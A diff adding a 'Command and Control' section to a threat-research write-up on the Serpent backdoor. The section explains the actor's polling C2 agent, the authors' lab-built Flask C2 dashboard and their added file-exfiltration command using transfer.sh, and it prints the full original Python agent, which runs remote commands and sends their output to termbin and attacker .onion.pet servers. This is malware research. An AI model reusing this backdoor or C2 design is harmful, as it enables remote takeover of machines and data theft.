@@ -51,9 +51,169 @@ Next, the powershell script downloaded another image (```https://www.fhccu[.]com
 During this study, we came up with a similar powershell script, named [**chocoloader.ps1**](tools/chocoloader.ps1), that installs [**Anaconda**](https://community.chocolatey.org/packages/anaconda3) instead which doesn't require elevated privileges. We also implemented a registry run key persistence which will run python and the serpent backdoor. 
 
 ---
-## Custom C2
+## Command and Control
 
-TODO
+Both Proofpoint's and VMWare TAU's analysis revealed a custom C2 Agent written in Python by the Threat Actor (see the full client code at the end of this chapter).
+
+This custom C2 Agent is a step-by-step :
+1. Every 10 seconds, the client will fetches text-based commands from the _"orders"_ / _"commands"_ server with its hostname as a unique identifier in the "Referer" HTTP header
+
+![Initial request from client to server](img/image38.png "Initial request from client to server")
+
+3. If the response contains something, and is different from the last command, the client waits 20 seconds, then runs the new command
+
+5. Then, in order to collect the output, the client will send it to Termbin, a pastebin-like website : give it content and receive a link to access your previously uploaded content
+
+7. This request is sent to URLs ending with ".onion.pet", where _.pet_ domains act as proxies to the real Tor network's websites
+
+9. Once Termbin sent back a link to the client, it is then sent to another _.pet_ domain controlled by attackers, which will act as an _"anwser"_ server with, again, the "Referer" HTTP header being used to store the hostname and the Termbin link
+
+In a simpler non-technical version :
+1. Every 10 seconds, the python client asks the C2 Server new commands to execute
+2. Then it executes a new command for the given hostname
+3. Output of the command is sent to a pastebin-like website, in exchange for a public link
+4. This link is then sent to another attacker-controlled server, where is would then be accessed by attackers
+
+From the C2 Agent, we mapped the workflow of the Command & Control cycle, and the data exfiltration process :
+
+![Serpent Group custom C2 Workflow](img/workflow_apt_english.png "Threat Actor Command & Control Infrastructure")
+
+For testing purposes, in order to reproduce this environment, with merged the two servers (commands and answers) into one, and removed the Tor proxy part :
+_lab testing workflow_
+
+Now, from the reverse engineering of the client, we developed the C2 Server application according to the logic of the client.
+We used the following development stack :
+- Back-end : Flask for Python Web Server
+- Front-End : VueJS / TailwindCSS
+- Database : SQLite3 
+
+Here is our **godly designed** dahsboard :
+![Our amazing custom C2 Dashboard](img/c2dashboard.png "Our amazing custom C2 Dashboard")
+
+In the upper-side, you can see infected machines and their general info :
+- IP address
+- Hostname
+- OS
+
+Once you click a machine, more information is shown in the lower part, and commands can be given to this machine.
+For instance, an operator could want to know what files are in the home directory of an infected user, and would give the following command : 
+![image21.png](img/image21.png "image21.png")
+
+The C2 Client on the infected machine will fetch the order, execute, send the output to Termbin, and send the link back to the C2 Server :
+
+![C2 Server receiving an output link from an infected machine (here narek-pc)](img/image26.png "C2 Server receiving an output link from an infected machine (here narek-pc)")
+
+Once the C2 Server registered the response link, the operator can freely check the output, and delete if needed :
+![Lower part of our C2 Dashboard](img/image23.png "Lower part of our C2 Dashboard")
+
+Now here is a video demo of the basic C2 workflow and data exfil :
+![Output of executed command](img/image5.png "Output of executed command")
+
+However, **files exfiltration** was not part of the process,
+
+So, we developed it following the same data exfil procedure for text content : compress files and send them to an online files hosting service, in exchange for a link. The service used was _transfer.sh_ :
+![File sharing service from command-line](img/image30.png "File sharing service from command-line")
+
+In order to compress folders into a zip archive, we used the native Powershell function called _Compress-Archive_, and added this module to the Client.
+
+We created a custom command with a basic syntax :
+```bash
+ccdl <file1> <file2>
+```
+
+![Operator uses our custom get files command](img/image17.png "Operator uses our custom get files command")
+![image37.png](img/image37.png)
+
+And as previously, the C2 Operator receives the link and can now download files from an infected machine :
+![Link to files got from infected machine](img/image31.png "Link to files got from infected machine")
+
+![image13.png](img/image13.png)
+
+_This module is rudimentary, and could be improved to be able to download particular files. Indeed, the Powershell function allows to create archives of a maximum size of 2GB. However, this does not require installing any additional tools, and could potentially not raise alerts._
+
+Here is the original Python C2 Agent :
+
+```python
+#!/usr/bin/python3  
+  
+from subprocess import Popen, PIPE, STDOUT  
+import requests  
+import re  
+import socket  
+import time  
+  
+cmd\_url\_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd[.]onion.pet/index.html'  
+cmd\_url\_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid[.]onion.pet/index.html'  
+hostname = socket.gethostname()  
+hostname_pattern = 'host:%s-00' % hostname  
+headers = {}  
+referer = {'Referer': hostname_pattern}  
+cache_control = {'Cache-Control': 'no-cache'}  
+headers.update(referer)  
+headers.update(cache_control)  
+check\_cmd\_1 = ''  
+  
+def recvall(sock, n):  
+  data = b''  
+  while len(data) < n:  
+    packet = sock.recv(n - len(data))  
+    if not packet:  
+      return None  
+    data += packet  
+  return data  
+  
+  
+def get_cmd():  
+    req = requests.get(cmd\_url\_order, headers=headers).content.decode().strip()  
+    if req == '':  
+        pass  
+    else:  
+        return req  
+  
+def run_cmd(cmd):  
+    cmd_split = cmd.split('--')  
+    if cmd_split\[1\] == hostname:  
+        cmd = cmd_split\[2\]  
+        print(cmd)  
+        run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()  
+        out = run.stdout.read()  
+        if not out:  
+            out = b'ok'  
+        termbin_cnx = socks.socksocket()  
+        termbin\_cnx = socket.socket(socket.AF\_INET, socket.SOCK_STREAM)  
+        socks.setdefaultproxy(socks.PROXY\_TYPE\_SOCKS5, '172.17.0.1', '9050', True)  
+        termbin_cnx.connect(('termbin[.]com', 9999))  
+        termbin_cnx.send(out)  
+        recv = termbin_cnx.recv(100000)  
+        termbin\_url\_created = recv.decode().rstrip('\\x00').strip()  
+        print(termbin\_url\_created)  
+        termbin\_header = {'Referer': hostname\_pattern+" -- "+termbin\_url\_created}  
+        headers.update(termbin_header)  
+        try:  
+            push = requests.get(cmd\_url\_answer, headers=headers)  
+            print('executed')  
+            headers.update(referer)  
+        except Exception as e:  
+            print(e)  
+            pass  
+    else:  
+        print('not for me')  
+         
+while True:  
+    time.sleep(10)  
+    try:  
+        check\_cmd = get\_cmd()  
+        if check\_cmd != check\_cmd_1:  
+            time.sleep(20)  
+            print(check_cmd)  
+            run\_cmd(check\_cmd)  
+            check\_cmd\_1 = check_cmd  
+            pass  
+    except Exception as e:  
+        print(e)  
+        pass
+
+```
 
 ---
 ## Defense
